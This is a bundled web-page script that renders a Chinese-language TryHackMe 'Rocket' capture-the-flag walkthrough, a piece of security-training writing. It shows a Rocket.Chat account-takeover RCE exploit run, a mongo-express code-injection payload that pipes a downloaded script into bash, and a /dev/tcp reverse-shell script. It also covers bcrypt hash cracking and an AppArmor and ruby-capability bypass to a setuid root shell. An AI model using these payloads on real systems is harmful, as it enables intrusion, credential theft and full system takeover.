"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4472],{21543:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var r=t(74848),s=t(28453);const a={sidebar_position:187,tags:["Easy","Linux","capabilities"],title:"Rocket",description:"Rocket",sidebar_label:"Rocket",slug:"/tryhackme/187"},c="Rocket",i={id:"box/TryHackMe/187",title:"Rocket",description:"Rocket",source:"@site/docs/box/TryHackMe/187.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/187",permalink:"/docs/tryhackme/187",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"capabilities",permalink:"/docs/tags/capabilities"}],version:"current",sidebarPosition:187,frontMatter:{sidebar_position:187,tags:["Easy","Linux","capabilities"],title:"Rocket",description:"Rocket",sidebar_label:"Rocket",slug:"/tryhackme/187"},sidebar:"boxSidebar",previous:{title:"Adventure Time",permalink:"/docs/tryhackme/186"},next:{title:"Misguided Ghosts",permalink:"/docs/tryhackme/188"}},o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"rocketchat (172.17.0.3)",id:"rocketchat-1721703",level:3},{value:"mongo (172.17.0.4:8081)",id:"mongo-17217048081",level:3},{value:"root(172.17.0.4)",id:"root1721704",level:3},{value:"alvin",id:"alvin",level:3},{value:"alvin \u2014&gt; root",id:"alvin--root",level:3}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"rocket",children:"Rocket"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"root@ip-10-10-64-224:~/rocket# nmap -sTCV -p- --min-rate 1000 10.10.190.108\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-12-02 01:19 GMT\nNmap scan report for ip-10-10-190-108.eu-west-1.compute.internal (10.10.190.108)\nHost is up (0.0100s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 b5:20:37:9f:99:b2:4f:23:ba:3a:43:60:b7:45:c8:62 (RSA)\n|   256 12:77:83:03:1f:64:bb:40:5d:bf:2c:48:e2:5a:b5:18 (ECDSA)\n|_  256 74:7c:e6:07:78:fc:fd:45:1d:e8:2b:d5:02:66:8e:cd (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to http://rocket.thm\nMAC Address: 02:02:7D:70:AC:51 (Unknown)\nService Info: Host: rocket.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.23 seconds\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-64-224:~/rocket# curl -I http://rocket.thm/\nHTTP/1.1 200 OK\nDate: Sat, 02 Dec 2023 01:52:39 GMT\nServer: Apache/2.4.29 (Ubuntu)\nCache-Control: max-age=0, must-revalidate, private\nX-Powered-By: Bolt\nLink: <http://rocket.thm/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"\nExpires: Sat, 02 Dec 2023 01:52:40 GMT\nContent-Type: text/html; charset=UTF-8\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u770b HTTP \u7684 header ",(0,r.jsx)(n.code,{children:"X-Powered-By: Bolt"})," \u53ef\u4ee5\u53d1\u73b0\u5176\u4e3a\u4e00\u4e2a\u5bf9\u5e94\u7684 CMS \u7a0b\u5e8f, \u5728\u5176\u4e2d\u67e5\u770b\u65f6\u6211\u4eec\u53ef\u4ee5\u6536\u96c6\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u5185\u90e8\u7528\u6237\u4ee5\u53ca\u5176\u90ae\u7bb1"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"Kevin Boyle --\x3e kevin --\x3e kevin@rocket.thm\nMarcus Quigley --\x3e marcus --\x3e marcus@rocket.thm\nLaurent Povolski --\x3e laurent--\x3e laurent@rocket.thm\nLucy Crooks --\x3e lucy--\x3e lucy@rocket.thm\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e\u7aef\u53e3\u626b\u63cf\u7684\u7ed3\u6784\u6211\u53d1\u73b0\u5176\u544a\u8bc9\u6211\u4eec\u6307\u5411\u4e86\u4e00\u4e2a\u57df\u540d, \u6309\u7167\u4f20\u7edf\u6765\u8bf4\u6211\u559c\u6b22\u5148\u6253\u5b50\u57df, \u9996\u5148\u8fdb\u884c\u5b50\u57df\u7684\u679a\u4e3e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"root@ip-10-10-64-224:~/rocket# ffuf -\\w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://rocket.thm/ -H 'Host: FUZZ.rocket.thm' -fw 20\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://rocket.thm/\n :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.rocket.thm\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response words: 20\n________________________________________________\n\nchat                    [Status: 200, Size: 224515, Words: 12566, Lines: 490]\n:: Progress: [114532/114532] :: Job [1/1] :: 5127 req/sec :: Duration: [0:00:27] :: Errors: 0 ::\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u5b58\u5728\u4e00\u4e2a\u5b50\u57df ",(0,r.jsx)(n.code,{children:"chat"})," , \u6309\u7167\u540d\u79f0\u63a8\u6d4b\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u804a\u5929\u7cfb\u7edf, \u4e4b\u540e\u8fdb\u884c\u8bbf\u95ee, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd9\u662f\u4e00\u4e2a\u804a\u5929\u7cfb\u7edf, \u5e76\u4e14\u652f\u6301\u6211\u4eec\u8fdb\u884c\u521b\u5efa\u7528\u6237\u8fdb\u884c\u8bbf\u95ee\u4e4b\u540e\u6211\u521b\u5efa\u7528\u6237\u8bbf\u95ee\u5176\u4e2d, \u53d1\u73b0\u4e00\u4e9b\u5185\u5bb9:"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u5b58\u5728\u51e0\u4e2a\u7528\u6237 : admin\u3001laurent\u3001terrance"}),"\n",(0,r.jsx)(n.li,{children:"\u4e0d\u5b58\u5728\u5176\u4ed6\u5229\u7528\u7684\u65b9\u5f0f, \u4f46\u662f\u6309\u7167\u663e\u793a\u6765\u770b\u8fd9\u662f\u4e00\u4e2a CMS"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-231940.png",alt:"image-20240709231939204"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ecf\u8fc7\u641c\u7d22\u6211\u53d1\u73b0\u4e86\u5176\u662f\u4e00\u4e2a Girhub \u5f00\u6e90\u7a0b ",(0,r.jsx)(n.a,{href:"https://github.com/RocketChat/Rocket.Chat",children:"Rocket.Chat"})," \u63a5\u7740\u7ecf\u8fc7\u641c\u7d22\u6211\u53d1\u73b0\u4e86\u5bf9\u5e94\u7684\u6f0f\u6d1e\u5229\u7528 EXP ",(0,r.jsx)(n.a,{href:"https://github.com/optionalCTF/Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911",children:"Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911"})," , \u6211\u67e5\u770b\u5bf9\u5e94\u7684 EXP \u540e, \u53d1\u73b0\u5176\u9700\u8981\u4e00\u4e9b\u6761\u4ef6"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u4e00\u4e2a\u8d26\u6237, \u4e0d\u5b58\u5728 2FA"}),"\n",(0,r.jsxs)(n.li,{children:["\u7ba1\u7406\u5458\u90ae\u7bb1 : \u8fd9\u4e2a\u5bf9\u5e94\u7684\u6211\u4eec\u6ca1\u6709, \u5728\u5bf9 ",(0,r.jsx)(n.code,{children:"rocket.thm"})," \u4fe1\u606f\u6536\u96c6\u65f6\u6211\u6536\u96c6\u5230\u4e86\u5bf9\u5e94\u7f51\u7ad9\u7684\u4e00\u4e2a\u90ae\u7bb1\u7ed3\u6784"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"rocketchat-1721703",children:"rocketchat (172.17.0.3)"}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u6211\u4eec\u5f97\u5230\u7684\u7a0b\u5e8f\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-141-243:~/rocket/CVE-2021-22911# python3 exploit.py  -u test@qq.com -a admin@rocket.thm -H http://chat.rocket.thm/ --ip 10.10.141.243 --port 4444\n[+] User: test@qq.com exists\n[+] Attempting to Authenticate With Provided Password\n[-] Unable to Authenticate\n[+] Commencing Account Takeover!\n[+] Password Reset Email Sent\n[+] Pulling Password Reset Token\n[+] Reset Token: TPFfxF5xOaYMrnL6DO9wK7mWSDXDzFTJWdTDuWrC0Xc\n[+] Password was changed to P@$$w0rd!1234\n[+] NO 2FA DETECTED\n[+] User: admin@rocket.thm exists\n[+] Attempting to Authenticate With Provided Password\n[-] Unable to Authenticate\n[+] Commencing Account Takeover!\n[+] Password Reset Email Sent\n[+] Pulling Password Reset Token\n[+] Reset Token: JgdjZNHvR2jIG--dpYZW2udwFSPnvfH2VGgFmvcA8PY\n[+] Password was changed to P@$$w0rd!1234\n[+] Succesfully authenticated as administrator\n[+] Sending Reverse Shell Integration\n[+] Shell for 10.10.141.243:4444 Has Executed!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232028.png",alt:"image-20240709232026877"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u4fe1\u606f\u6536\u96c6, \u6211\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a DOCKER \u73af\u5883, \u5e76\u4e14\u7cfb\u7edf\u4e2d\u5b58\u5728 Docker \u73af\u5883, \u5728 Docker \u4e2d\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u6211\u83b7\u53d6\u5230\u4e00\u4e9b\u4fe1\u606f"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"\u4e3b\u673a\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) rocketchat@c2c82695ecf1:/app/bundle/programs/server$ hostname -I\n172.17.0.3 \n(remote) rocketchat@c2c82695ecf1:/app/bundle/programs/server$ cat /etc/hosts\n172.17.0.2\tdb f012d09a863c  # \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u76f4\u5230\u8fd9\u662f\u4e00\u4e2a\u6570\u636e\u5e93\n172.17.0.3\tc2c82695ecf1\n"})}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:["\u67e5\u770b\u73af\u5883\u53d8\u91cf\u4fe1\u606f, \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u76f4\u5230 DB \u4f4d\u4e8e ",(0,r.jsx)(n.code,{children:"172.17.0.2:27017"})," , \u6709\u4e00\u4e2a MONGO \u7684 web \u7a0b\u5e8f\u5176\u5bf9\u5e94\u7aef\u53e3\u4e3a 8081"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) rocketchat@c2c82695ecf1:/$ env\nDirect_Reply_Port=\nDirect_Reply_Frequency=5\nDB_PORT_27017_TCP_PORT=27017\nDB_ENV_MONGO_REPO=repo.mongodb.org\nDB_PORT_27017_TCP=tcp://172.17.0.2:27017\nDB_PORT=tcp://172.17.0.2:27017\nDB_PORT_27017_TCP_ADDR=172.17.0.2\nDB_ENV_MONGO_PACKAGE=mongodb-org\nMONGO_WEB_INTERFACE=172.17.0.4:8081\nDB_NAME=/rocketchat/db\nMONGO_OPLOG_URL=mongodb://db:27017/local\nDirect_Reply_IgnoreTLS=false\n"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1, \u8bbf\u95ee\u6211\u4eec\u7684\u6570\u636e\u5e93, \u770b\u770b\u80fd\u4e0d\u80fd\u83b7\u53d6\u5230\u4ec0\u4e48\u5bc6\u7801\u4e4b\u7c7b\u7684\u5185\u5bb9"}),"\n",(0,r.jsx)(n.h3,{id:"mongo-17217048081",children:"mongo (172.17.0.4:8081)"}),"\n",(0,r.jsx)(n.p,{children:"\u8bbf\u95ee\u53d1\u73b0\u9700\u8981\u5bc6\u7801,. \u4e4b\u540e\u7ecf\u8fc7\u641c\u7d22\u6211\u53d1\u73b0\u4e86\u5176\u9ed8\u8ba4\u7684\u8d26\u53f7\u5bc6\u7801"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232039.png",alt:"image-20240709232037992"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u6210\u529f\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232046.png",alt:"image-20240709232045025"})}),"\n",(0,r.jsxs)(n.p,{children:["\u63a5\u7740\u7ecf\u8fc7\u641c\u7d22\u6211\u53d1\u73b0\u4e00\u4e2a RCE \u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://github.com/masahiro331/CVE-2019-10758",children:"CVE-2019-10758"}),", \u4e4b\u540e\u5229\u7528\u6b64\u6765\u83b7\u53d6\u4e00\u4e2a\u65b0\u7684 Shell"]}),"\n",(0,r.jsx)(n.h3,{id:"root1721704",children:"root(172.17.0.4)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-141-243:~/rocket# cat reverse.sh \n#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.141.243/4445 0>&1" \nroot@ip-10-10-141-243:~/rocket# python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n10.10.213.185 - - [03/Dec/2023 10:12:07] "GET /reverse.sh HTTP/1.1" 200 -\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-141-243:~/rocket# proxychains curl http://172.17.0.4:8081/checkValid -H \'Authorization: Basic YWRtaW46cGFzcw==\' --data \'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl http://10.10.141.243:8000/reverse.sh | bash")\'\nProxyChains-3.1 (http://proxychains.sf.net)\n|S-chain|-<>-127.0.0.1:8081-<><>-172.17.0.4:8081-<><>-OK\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232124.png",alt:"image-20240709232122534"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u5728\u5176\u4e2d\u8fdb\u884c\u641c\u7d22\u7ed3\u679c\u53d1\u73b0\u4e00\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u5907\u4efd\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"bash-5.0# ls -al bson.hash\nls -al bson.hash\n-rw-r--r--    1 root     root            70 Jun  1  2021 bson.hash\nbash-5.0# cat bson.hash\ncat bson.hash\nTerrance:$2y$04$cPMSyJolnn5/p0X.B3DMIevZ9M.qiraQw.wY9rgf4DrFp0yLA5DHi\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u8fdb\u884c\u5bc6\u7801\u7834\u89e3, \u7834\u89e3\u6210\u529f\u540e, \u6211\u672c\u6765\u662f\u60f3\u76f4\u63a5 SSH \u767b\u5f55\u4f46\u662f\u6ca1\u6709\u6210\u529f, \u73b0\u5728\u53ef\u80fd\u9700\u8981\u8fd4\u56de\u4e3b\u7ad9\u505a\u4e00\u4e9b\u64cd\u4f5c\u4e86"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-141-243:~/rocket# john user.hash --wordlist=`locate rockyou.txt`\nWarning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"\nUse the "--format=bcrypt-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 16 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n1q2w3e4r5        (Terrance)\n1g 0:00:00:18 DONE (2023-12-03 10:16) 0.05500g/s 2281p/s 2281c/s 2281C/s 200685..180893\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee\u6211\u4eec\u7684 ",(0,r.jsx)(n.code,{children:"Bolt"})," \u8fdb\u884c\u767b\u5f55, \u5728\u8fd9\u91cc\u6211\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"admin:1q2w3e4r5"})," \u6210\u529f\u767b\u5f55\u76ee\u6807\u7ad9\u70b9, \u4e4b\u540e\u5c31\u662f\u4e0a\u4f20 webShell  \u4e00\u5957\u64cd\u4f5c"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232135.png",alt:"image-20240709232134079"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u9700\u8981\u4fee\u6539\u540e\u53f0\u914d\u7f6e, \u624d\u53ef\u4ee5\u4e0a\u4f20 PHP \u6587\u4ef6, \u5177\u4f53\u4e0a\u4f20\u914d\u7f6e\u67e5\u770b"}),"\n",(0,r.jsx)(n.h3,{id:"alvin",children:"alvin"}),"\n",(0,r.jsx)(n.p,{children:"\u4e4b\u540e\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u5373\u53ef\u83b7\u53d6\u5230 Shell, \u540c\u65f6\u8fd9\u4e5f\u662f\u771f\u5b9e\u7269\u7406\u4e3b\u673a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-232217.png",alt:"image-20240709232216269"})}),"\n",(0,r.jsx)(n.h3,{id:"alvin--root",children:"alvin \u2014> root"}),"\n",(0,r.jsxs)(n.p,{children:["\u4e4b\u540e\u67e5\u770b\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u7a0b\u5e8f, \u5176\u5177\u6709\u7279\u6b8a\u7684\u529f\u80fd ",(0,r.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/ruby/#capabilities",children:"ruby#capabilities"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) alvin@rocket:/$ getcap -r / 2>/dev/null\n/usr/bin/ruby2.5 = cap_setuid+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u6267\u884c\u4f1a\u53d1\u73b0\u65e0\u6cd5\u5229\u7528, \u5bf9\u6b64\u8be2\u95ee GPT \u56de\u7b54\u544a\u8bc9\u6211\u5bf9\u5e94\u7a0b\u5e8f\u6ca1\u6709\u7279\u6743, \u4f30\u8ba1\u662f\u505a\u4e86\u9650\u5236"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) alvin@rocket:/$ /usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'\nTraceback (most recent call last):\n\t1: from -e:1:in `<main>'\n-e:1:in `setuid': Operation not permitted (Errno::EPERM)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ecf\u8fc7\u76f8\u5173\u4e86\u89e3\u540e, \u6211\u610f\u8bc6\u5230\u8fd9\u91cc\u5b58\u5728 apparmor \u9650\u5236, \u4e4b\u540e\u7ecf\u8fc7\u641c\u7d22\u53d1\u73b0\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) alvin@rocket:/$ find / -type f 2>/dev/null | grep ruby\n.....\n/etc/apparmor.d/cache/usr.bin.ruby2.5\n/etc/apparmor.d/usr.bin.ruby2.5\n/etc/apparmor.d/abstractions/ruby\n....\n(remote) alvin@rocket:/$ cat /etc/apparmor.d/usr.bin.ruby2.5\n# Last Modified: Mon Jun 14 23:01:44 2021\n#include <tunables/global>\n\n/usr/bin/ruby2.5 {\n  #include <abstractions/base>\n\n  capability setuid,\n\n  deny owner /etc/nsswitch.conf r,\n  deny /root/* rwx,\n  deny /etc/shadow rwx,\n\n  /etc/passwd r,\n  /bin/cat mrix,\n  /bin/cp mrix,\n  /bin/ls mrix,\n  /usr/bin/whoami mrix,\n  /tmp/.X[0-9]*-lock rw,\n  /lib/x86_64-linux-gnu/ld-*.so mr,\n  /usr/bin/ruby2.5 mr,\n  /usr/share/rubygems-integration/all/specifications/ r,\n  /usr/share/rubygems-integration/all/specifications/did_you_mean-1.2.0.gemspec r,\n  /{usr/,}lib{,32,64}/** mr,\n\n}\n(remote) alvin@rocket:/$\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8ba9 GPT \u5e2e\u52a9\u6211\u8fdb\u884c\u89e3\u8bfb\u4e4b\u540e\u6211\u4e86\u89e3\u4e86\u4e00\u4e9b\u5185\u5bb9, \u8fd9\u91cc\u552f\u72ec\u53ea\u5bf9 ",(0,r.jsx)(n.code,{children:"/tmp/.X[0-9]*-lock"})," \u505a\u4e86\u989d\u5916\u7684\u914d\u7f6e, \u4e5f\u8bb8\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u8fdb\u884c\u5229\u7528"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"alvin@rocket:/tmp$ cp /bin/bash .X1-lock\nalvin@rocket:/tmp$ chmod u+s .X1-lock \nalvin@rocket:/tmp$ /usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec \"cp --preserve=mode /tmp/.X1-lock /tmp/.X2-lock\"'\nalvin@rocket:/tmp$ ls -al .X2-lock \n-rwsr-xr-x 1 root alvin 1113504 Dec  3 10:58 .X2-lock\nalvin@rocket:/tmp$ ./.X2-lock -p\n.X2-lock-4.4# id\nuid=1000(alvin) gid=1000(alvin) euid=0(root) groups=1000(alvin)\n"})})]})}function d(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>i});var r=t(96540);const s={},a=r.createContext(s);function c(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);